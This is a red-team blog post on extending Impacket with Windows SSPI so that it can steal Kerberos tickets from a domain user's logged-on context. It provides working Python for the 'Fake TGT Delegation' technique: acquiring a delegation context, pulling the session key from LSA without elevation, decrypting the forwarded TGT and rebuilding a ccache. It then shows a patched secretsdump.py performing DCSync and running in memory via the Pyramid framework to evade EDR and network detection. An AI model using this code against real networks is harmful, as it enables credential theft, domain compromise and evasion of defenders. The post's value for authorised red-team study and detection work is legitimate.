---
layout: post
title: "Python ❤️ SSPI: Teaching Impacket to Respect Windows SSO"
date: 2024-04-30 00:00:00 +0300
author: snovvcrash
tags: [pt-swarm, active-directory, kerberos, tgt-delegation, impacket, sspi]
---

[//]: # (2024-01-11)

Given the Bring Your Own Interpreter (BYOI) concept, the combination of Impacket usage and SSPI capabilities can allow attackers to fly under the radar of endpoint security mechanisms as well as custom network detection rules more efficiently. We will discuss it in more detail further in the article.

<!--cut-->

<p align="right">
  <a href="https://swarm.ptsecurity.com/python-sspi-teaching-impacket-to-respect-windows-sso/"><img src="https://img.shields.io/badge/PT-SWARM-ce0808?style=flat-square" alt="ptswarm-badge.svg" /></a>
</p>

A one handy feature of our private [Impacket](https://github.com/fortra/impacket) (by [@fortra](https://github.com/fortra)) fork is that it can leverage native SSPI interaction for authentication purposes when operating from a legit domain context on a Windows machine.

As far as the partial implementation of [Ntsecapi](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/) represents a minified version of Oliver Lyak's ([@ly4k_](https://twitter.com/ly4k_)) **sspi** module used in his great [Certipy](https://github.com/ly4k/Certipy) project, I'd like to break down its core features and showcase how easily it can be integrated into known Python tooling.

[![banner.png](/assets/images/impacket-sspi/banner.png)](/assets/images/impacket-sspi/banner.png)
{:.center-image}

* TOC
{:toc}

# Fake TGT Delegation

The original author of the SSPI trick known as Fake TGT Delegation that — which is now commonly used by hackers to obtain valid Kerberos tickets from a domain context — was Benjamin Delpy ([@gentilkiwi](https://twitter.com/gentilkiwi)), who's implemented it in his [Kekeo](https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c) toolkit. By doing some SSPI [GSS-API](https://learn.microsoft.com/en-us/previous-versions/ms995352(v=msdn.10)) magic, we can initialize a new security context specifying the [`ISC_REQ_DELEGATE`](https://learn.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initializesecuritycontexta) flag in order to trigger a TGS-REQ/TGS-REP exchange against a target service that supports **Unconstrained Delegation** ([`TRUSTED_FOR_DELEGATION`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)). This results in having [`OK-AS-DELEGATE`](https://datatracker.ietf.org/doc/html/rfc4120#section-2.8) for the first TGS-REP and invoking another TGS-REQ/TGS-REP exchange, the purpose of which is to obtain **a forwarded TGT for the current user** returned by the KDC in the second TGS-REP.

[![wireshark-capture-1.png](/assets/images/impacket-sspi/wireshark-capture-1.png)](/assets/images/impacket-sspi/wireshark-capture-1.png)
{:.center-image}

After that, the client will shoot an AP-REQ containing the forwarded TGT inside its Authenticator (the [`KRB-CRED`](https://datatracker.ietf.org/doc/html/rfc4120#section-3.6) part of the Authenticator checksum) via GSS-API/Kerberos whose output stream is accessible to us. The good news is that we can decrypt the Authenticator with a cached session key of the forwarded TGT, extracted from the LSA with a non-privileged Windows API call (session key extraction **does not require elevation** in this case), and re-use it for our own needs.

[![wireshark-capture-2.png](/assets/images/impacket-sspi/wireshark-capture-2.png)](/assets/images/impacket-sspi/wireshark-capture-2.png)
{:.center-image}

The technique is also implemented in [Rubeus](https://github.com/GhostPack/Rubeus)'s `tgtdeleg` module and is explained well by the authors: https://github.com/GhostPack/Rubeus#tgtdeleg.

A high level overview of the main Win32 API calls required for extracting Kerberos tickets from the current user context is presented in the diagram below. The holy API quartet for these operations is:

- [AcquireCredentialsHandle](https://learn.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acquirecredentialshandlea);
- [InitializeSecurityContext](https://learn.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initializesecuritycontexta);
- [LsaConnectUntrusted](https://learn.microsoft.com/is-is/windows/win32/api/ntsecapi/nf-ntsecapi-lsaconnectuntrusted);
- [LsaCallAuthenticationPackage](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage).

[![fake-tgt-delegation.png](/assets/images/impacket-sspi/fake-tgt-delegation.png)](/assets/images/impacket-sspi/fake-tgt-delegation.png)
{:.center-image}

## Pythonic Ntsecapi

The main purpose of adding SSPI features to the Impacket library is to effectively re-use the current AD context in a classic Windows Single Sign-On style, eliminating the need to manually specify the target credential material to be used. [Introduced in Certipy 4.0](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7), the [sspi](https://github.com/ly4k/Certipy/tree/main/certipy/lib/sspi) part is intended to achieve the same goal:

> "Now, imagine you just got code execution on a domain-joined machine. You could run your C2 agent, open a SOCKS proxy connection, and then run Certipy through that. The problem in this scenario is that you don’t know the credentials of your current user context." — (c) Oliver Lyak, https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7

Having successfully initialized security context and received a corresponding SSPI **initial context token** from SSPI GSSAPI (with an encrypted TGT inside), we can invoke `LsaConnectUntrusted` in order to obtain a handle to LSA and query Authentication Packages (AP):

```python
def get_tgt(target):
    ctx = AcquireCredentialsHandle(None, "kerberos", target, SECPKG_CRED.OUTBOUND)
    res, ctx, data, outputflags, expiry = InitializeSecurityContext(
        ctx,
        target,
        token=None,
        ctx=ctx,
        flags=ISC_REQ.DELEGATE | ISC_REQ.MUTUAL_AUTH | ISC_REQ.ALLOCATE_MEMORY,
    )

    if res == SEC_E.OK or res == SEC_E.CONTINUE_NEEDED:
        lsa_handle = LsaConnectUntrusted()
        kerberos_package_id = LsaLookupAuthenticationPackage(lsa_handle, "kerberos")
```

The further call to `LsaCallAuthenticationPackage` allows us to request raw ticket material associated with the current logon session which contains a **session key**:

```python
def extract_ticket(lsa_handle, package_id, luid, target_name):
    message = retrieve_tkt_helper(target_name, logonid=luid)
    ret_msg, ret_status, free_ptr = LsaCallAuthenticationPackage(
        lsa_handle, package_id, message
    )

    ticket = {}
    if ret_status != 0:
        raise WinError(LsaNtStatusToWinError(ret_status))
    if len(ret_msg) > 0:
        resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(ret_msg)
        ticket = resp.Ticket.get_data()
        LsaFreeReturnBuffer(free_ptr)

    return ticket
```

Now, the operator has all the necessary information blobs to construct another copy of the Kerberos cache (from `AS-REQ` all the way down to `KRB-CRED`) in **.kirbi** or **.ccache** formats and re-use it for their own needs:

```python
raw_ticket = extract_ticket(lsa_handle, kerberos_package_id, 0, target)
key = Key(raw_ticket["Key"]["KeyType"], raw_ticket["Key"]["Key"])
token = InitialContextToken.load(data[0][1])
ticket = AP_REQ(token.native["innerContextToken"]).native

cipher = _enctype_table[ticket["authenticator"]["etype"]]
dec_authenticator = cipher.decrypt(key, 11, ticket["authenticator"]["cipher"])
authenticator = Authenticator.load(dec_authenticator).native
if authenticator["cksum"]["cksumtype"] != 0x8003:
    raise Exception("Bad checksum")
checksum_data = AuthenticatorChecksum.from_bytes(
    authenticator["cksum"]["checksum"]
)

if ChecksumFlags.GSS_C_DELEG_FLAG not in checksum_data.flags:
    raise Exception("Delegation flag not set")
cred_orig = KRB_CRED.load(checksum_data.delegation_data).native
dec_authenticator = cipher.decrypt(key, 14, cred_orig["enc-part"]["cipher"])

# Reconstructing ccache with the unencrypted data
te = {}
te["etype"] = 0
te["cipher"] = dec_authenticator
ten = EncryptedData(te)

t = {}
t["pvno"] = cred_orig["pvno"]
t["msg-type"] = cred_orig["msg-type"]
t["tickets"] = cred_orig["tickets"]
t["enc-part"] = ten

krb_cred = KRB_CRED(t)
ccache = CCache()
ccache.fromKRBCRED(krb_cred.dump())
return ccache
```

That is basically it when it comes to TGT reconstruction. Similar steps can be taken to craft an ST ([`get_tgs`](https://github.com/ly4k/Certipy/blob/2780d5361121dd4ec79da3f64cfb1984c4f779c6/certipy/lib/sspi/kerberos.py#L107-L134) — even simplier because we can skip the `AS-REQ` reconstruction part and go straight to `KRB-CRED` message initialization) or import tickets into current session ([`submit_ticket`](https://github.com/ly4k/Certipy/blob/2780d5361121dd4ec79da3f64cfb1984c4f779c6/certipy/lib/sspi/kerberos.py#L32-L47)). All the mentioned Windows methods can be dynamically resolved from the appropriate shared libraries in runtime via [ctypes](https://docs.python.org/3/library/ctypes.html) `windll` without having to drop pre-compiled Python extensions on disk.

Some other good resources to study ticket management and its Python implementation are:

- Rubeus, LSA.cs — https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs
- Python for Windows (pywin32) Extensions, sspi.py — https://github.com/mhammond/pywin32/blob/main/win32/Lib/sspi.py

## Making Use of SSPI in Impacket

When integrating SSPI into Impacket, I was targeting a scenario of minimal source code modification. I don't believe we should have this feature in the main branch due to its very specific use cases, but at the same time we want to be able to apply the SSPI module as easily as possible. I shall demonstrate the steps required to enable the `-sspi` switch for any Impacket example (that has Kerberos authentication option).

First, I will git clone a clean copy of the lastest Impacket repo and curl Oliver's minified sspi.py [from a GitHub gist of mine](https://gist.github.com/snovvcrash/ff867dbd922ff2c36f480c0a61819f29#file-sspi-py).

[![impacket-git-clone.png](/assets/images/impacket-sspi/impacket-git-clone.png)](/assets/images/impacket-sspi/impacket-git-clone.png)
{:.center-image}

Then, I'll add a code snippet responsible for handling the `-sspi` option logic in the `secretsdump.py` script (an example is also available [within the gist](https://gist.github.com/snovvcrash/ff867dbd922ff2c36f480c0a61819f29#file-secretsdump-py-patch)).

[![impacket-git-diff.png](/assets/images/impacket-sspi/impacket-git-diff.png)](/assets/images/impacket-sspi/impacket-git-diff.png)
{:.center-image}

Now, to make things fair, I'll ask a TGT while posing as a DC machine account and create a sacrificial process on its behalf, performing a classic Overpass-the-Key + Pass-the-Ticket attack chain.

[![rubeus-overpass-the-key.png](/assets/images/impacket-sspi/rubeus-overpass-the-key.png)](/assets/images/impacket-sspi/rubeus-overpass-the-key.png)
{:.center-image}

[![impacket-sspi-demo.png](/assets/images/impacket-sspi/impacket-sspi-demo.png)](/assets/images/impacket-sspi/impacket-sspi-demo.png)
{:.center-image}

As we can see from the image above, no credentials are provided to `secretsdump.py` via the command line; instead, SSPI is used to extract DC's TGT from current context which is saved on disk and later passed to the script inside an environment variable. Further possible use cases (like extracting STs) and other desirable improvements (like not saving tickets on disk) are left as an exercise for the reader 😉

## Bring Your Own Pyramid

So it may look cool, but there're not so many usable OpSec scenarios in which dropping pre-compiled Impacket examples on disk is better than running it remotely through a SOCKS proxy. I mean, PyInstaller does a good job generating a PE from most of the examples but such executables usually get immediately flagged. Despite the fact that making a FUD executable from Impacket is rather simple, staying in memory of a legit interpreter is more preferable most of the time.

Another great project that we happen to use rather often during RT Ops is the [Pyramid](https://github.com/naksyn/Pyramid) framework by Diego Capriotti ([@naksyn](https://twitter.com/naksyn)), which is designed to operate from EDR blind spots like a Python interpreter, implementing the Bring Your Own Interpreter (BYOI) concept. Due to the fact that [PEP 578](https://peps.python.org/pep-0578/) (Python Runtime Audit Hooks) is still not applied, defenders do not have an efficient way of analyzing what's happening under the hood of CPython, so we're relatively safe here.

Let's say, we have to perform DCSync from a target user context, but there's no way of grabbing their cleartext password / NT hash / AES keys / Kerberos tickets or AD CS certs to be used on the attacker's host via proxying. I will demonstrate a way to run `secretsdump.py` with SSPI authentication in a Pyramid way.

For the sake of the demo I will git clone Pyramid to a dedicated server, configure the web server and make the same modifications to the `secretsdump.py` example as described previously.

[![pyramid-setup.png](/assets/images/impacket-sspi/pyramid-setup.png)](/assets/images/impacket-sspi/pyramid-setup.png)
{:.center-image}

Now, all I have to do is to drop the cradle on the target and run it with a portable Python interpreter.

[![pyramid-demo.mp4.png](/assets/images/impacket-sspi/pyramid-demo.mp4.png)](https://swarm.ptsecurity.com/wp-content/uploads/2023/12/78407c97-pyramid-demo.mp4)
{:.center-image}

Once again, there are no credentials hardcoded inside `cradle.py` and authentication routine is performed via the SSPI interaction.

## Outro

There are cases when an attacker would definitely not want to touch LSASS or other sensitive Windows subsystems for intrusive credential harvesting, so SSPI negotiations may be a good alternative to obtain needed privileges. Combined with the BYOI concept, SSPI implementation for Impacket may help to stay undetectable in Python's memory and efficiently re-use current domain context in order to achieve the "hacky" goal during a Red Team Operation.
